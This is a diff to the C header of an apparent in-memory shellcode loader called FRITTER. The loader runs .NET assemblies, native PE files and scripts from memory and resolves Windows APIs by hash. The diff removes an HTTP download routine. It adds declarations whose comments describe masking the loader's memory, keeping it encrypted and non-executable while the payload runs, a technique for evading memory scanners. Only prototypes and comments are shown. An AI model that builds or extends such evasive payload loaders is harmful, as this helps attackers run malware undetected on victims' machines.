@@ -42,10 +42,8 @@
 #include <wincrypt.h>
 #include <oleauto.h>
 #include <objbase.h>
-#include <wininet.h>
 #include <shlwapi.h>
 
-#pragma comment(lib, "wininet.lib")
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "ole32.lib")
@@ -110,9 +108,6 @@ typedef struct _FRITTER_ASSEMBLY {
     MethodInfo      *mi;
 } FRITTER_ASSEMBLY, *PFRITTER_ASSEMBLY;
 
-    // Downloads a module from remote HTTP server into memory
-    BOOL DownloadFromHTTP(PFRITTER_INSTANCE);
-    
     // .NET DLL/EXE
     BOOL LoadAssembly(PFRITTER_INSTANCE, PFRITTER_MODULE, PFRITTER_ASSEMBLY);
     BOOL RunAssembly(PFRITTER_INSTANCE,  PFRITTER_MODULE, PFRITTER_ASSEMBLY);
@@ -120,6 +115,20 @@ typedef struct _FRITTER_ASSEMBLY {
 
     // In-Memory execution of native DLL
     VOID RunPE(PFRITTER_INSTANCE, PFRITTER_MODULE);
+
+// page protections of the shellcode's own memory
+#define PARK_DATA 1   // instance pages -> RW (nothing executes there after entry)
+#define PARK_CODE 2   // shim/loader pages -> RX while the payload runs
+#define PARK_OFF  0   // shim/loader pages -> RWX again (dispatcher needs to write)
+VOID ParkLoader(PFRITTER_INSTANCE, DWORD);
+// Mask stub: MaskCall returns what to call instead of fn so that the whole
+// loader is encrypted and non-executable until fn returns (fn itself when
+// there is no stub; the caller then parks the loader instead).
+PULONG64 MaskBase(PFRITTER_INSTANCE);
+PVOID    MaskCall(PFRITTER_INSTANCE, PVOID);
+// MaskIn returns what outside code should call instead of the loader
+// function fn, so that the call works while the loader is masked.
+PVOID    MaskIn(PFRITTER_INSTANCE, PVOID);
     
     // VBS / JS files
     VOID RunScript(PFRITTER_INSTANCE, PFRITTER_MODULE);
@@ -127,6 +136,7 @@ typedef struct _FRITTER_ASSEMBLY {
     LPVOID xGetProcAddressByHash(PFRITTER_INSTANCE, ULONGLONG, ULONGLONG);
 
     LPVOID xGetProcAddressByHash(PFRITTER_INSTANCE inst, ULONG64 ulHash, ULONG64 ulIV);
+ULONG64 xResolveApis(PFRITTER_INSTANCE inst, DWORD count);
 
     LPVOID xGetLibAddress(PFRITTER_INSTANCE inst, PCHAR dll_name);
 
